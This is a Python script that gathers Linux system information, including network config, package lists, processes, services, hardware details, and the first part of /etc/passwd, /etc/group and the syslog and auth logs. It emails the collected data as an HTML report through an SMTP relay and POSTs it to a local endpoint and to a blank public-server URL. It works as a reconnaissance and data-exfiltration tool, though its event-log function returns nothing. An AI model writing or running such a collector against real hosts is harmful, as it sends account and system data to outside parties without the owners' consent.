import subprocess, smtplib, socket, platform, os, requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Run shell commands and return output
def run_sh(sh):
    try:
        result = subprocess.check_output(sh, shell=True, text=True)
        return result.strip()
    except subprocess.CalledProcessError:
        return "Command failed or not available"

#Collect network info
def get_net_info():
    ip = run_sh("ip addr show")
    return ip

#Collect installed applications
def get_installed_apps():
    apps = run_sh("dpkg -l")
    return apps

#Collect important files
def get_important_files():
    files_content = {}
    important_files = ["/etc/passwd", "/etc/group", "/var/log/syslog", "/var/log/auth.log"]
    for filepath in important_files:
        if os.path.exists(filepath):
            try:
                with open(filepath, "r") as f:
                    content = f.read(1000)
                files_content[filepath] = content
            except Exception as e:
                files_content[filepath] = f"Could not read file: {e}"
        else:
            files_content[filepath] = "File does not exist."
    return files_content

#Collect running processes
def get_running_processes():
    processes = run_sh("ps aux")
    return processes

#Collect running services
def get_running_services():
    services = run_sh("systemctl list-units --type=service --state=running")
    return services

#Collect event logs
def get_event_logs():
    logs = ""
    if os.path.exists("/var/log/syslog"):
        logs = run_sh("tail -n 100 /var/log/syslog")
    elif os.path.exists("/var/log/messages"):
        logs = run_sh("tail -n 100 /var/log/messages")
    else:
        logs = "No syslog or messages found."

#Collect hardware info
def get_hardware_info():
    cpu = run_sh("lscpu")
    mem = run_sh("free -h")
    disk = run_sh("lsblk")
    return f"<h3>CPU Info</h3><pre>{cpu}</pre><h3>Memory Info</h3><pre>{mem}</pre><h3>Disk Info</h3><pre>{disk}</pre>"

#Compose HTML email body
def email_body():
    html = "<html><body>"
    html += "<h2>System Information Report (Linux)</h2>"
    html += "<h3>Network Info</h3><pre>{}</pre>".format(get_net_info())
    html += "<h3>Installed Applications</h3><pre>{}</pre>".format(get_installed_apps())
    html += "<h3>Important Files</h3>"
    important_files = get_important_files()
    for filepath, content in important_files.items():
        html += f"<h4>{filepath}</h4><pre>{content}</pre>"
    html += "<h3>Running Processes</h3><pre>{}</pre>".format(get_running_processes())
    html += "<h3>Running Services</h3><pre>{}</pre>".format(get_running_services())
    html += "<h3>System Event Logs</h3><pre>{}</pre>".format(get_event_logs())
    html += get_hardware_info()
    html += "</body></html>"
    return html

#Send mail using MailerSend
def send_mailersend(sender_email, sender_pass, recipient_email):
    msg = MIMEMultipart("alternative")
    msg["Subject"] = "System Information Report (Linux)"
    msg["From"] = sender_email
    msg["To"] = recipient_email

    html_body = email_body()
    part = MIMEText(html_body, "html")
    msg.attach(part)

    try:
        server = smtplib.SMTP("smtp.mailersend.net", 587)
        server.starttls()
        server.login(sender_email, sender_pass)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

#Send info to (local) server
def send_server(server_domip, use_json=True):
    data = {
        "network_info": get_net_info(),
        "installed_apps": get_installed_apps(),
        "important_files": get_important_files(),
        "running_processes": get_running_processes(),
        "running_services": get_running_services(),
        "hardware_info": get_hardware_info(),
        "event_logs": get_event_logs()
    }

    try:
        if use_json:
            response = requests.post(server_domip, json=data)
        else:
            response = requests.post(server_domip, data={"report": email_body()})
        
        if response.status_code == 200:
            print("Info successfully sent to server.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to server: {e}")            

if __name__ == "__main__":
    sender_email = ""
    sender_pass = ""
    recipient_email = ""

    send_mailersend(sender_email, sender_pass, recipient_email)

    local_server_domip = "http://localhost:5000/dolometis"
    send_server(local_server_domip, use_json=True)
    #Public server
    public_server_domip = ""
    send_server(public_server_domip, use_json=True)